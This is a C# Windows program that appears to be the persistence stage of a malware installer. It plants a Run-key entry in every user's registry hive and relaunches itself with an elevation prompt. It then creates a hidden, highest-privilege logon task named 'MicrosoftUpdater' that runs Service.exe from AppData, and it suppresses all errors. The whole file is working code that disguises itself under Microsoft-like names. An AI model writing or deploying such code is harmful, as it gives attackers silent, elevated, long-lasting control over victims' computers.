using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApp5
{
    class Program
    {
        static string name = "TasksUpdate";



        static void Main(string[] args)
        {
            bool isFirst = true;

            foreach (string arg in args)
            {
                if (arg == "-noentry") isFirst = false;
            }

            if (isFirst)
            {
                try
                {
                    SetAutorunValue(true);
                }
                catch (Exception ex)
                {

                }
            }
            else
            {

                WindowsPrincipal pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
                bool hasAdministrativeRight = pricipal.IsInRole(WindowsBuiltInRole.Administrator);

                if (hasAdministrativeRight == false)
                {
                    ProcessStartInfo processInfo = new ProcessStartInfo();
                    processInfo.Verb = "runas";
                    processInfo.Arguments = "-noentry";
                    processInfo.FileName = Application.ExecutablePath;
                    try
                    {
                        Process.Start(processInfo);
                    }
                    catch (Exception ex)
                    {

                    }
                    Application.Exit();
                }
                else
                {
                    new Process
                    {
                        StartInfo =
                        {
                            FileName = "cmd.exe",
                            Verb = "runas",
                            Arguments = "/C SCHTASKS /Delete /TN MicrosoftUpdater /F",
                            WindowStyle = ProcessWindowStyle.Hidden
                        }
                    }.Start();

                    new Process
                    {
                        StartInfo =
            {
                FileName = "cmd.exe",
                Verb = "runas",
                Arguments = "/C SCHTASKS /Create /RL HIGHEST /SC ONLOGON /TN MicrosoftUpdater /TR " +
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\MicrosoftUpdater\\Service.exe",
                WindowStyle = ProcessWindowStyle.Hidden
            }
                    }.Start();

                    SetAutorunValue(false);
                }
            }
        }

       
        public static bool SetAutorunValue(bool autorun)
        {
            string ExePath = AppDomain.CurrentDomain.BaseDirectory;
            string exe_name = System.IO.Path.GetFileName(Application.ExecutablePath);
            RegistryKey reg;
            string[] users = Registry.Users.GetSubKeyNames();
            foreach (string user in users)
            {
                
                try
                {
                    reg = Registry.Users.CreateSubKey(user + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
                    if (autorun)
                    {                        
                        reg.SetValue(name,'"' + ExePath + exe_name + '"' + " -noentry");
                    }
                    else
                    {
                        reg.DeleteValue(name);
                    }
                    reg.Close();
                }
                catch (Exception ex)
                {
                }
            }
            return true;
        }
    }
}
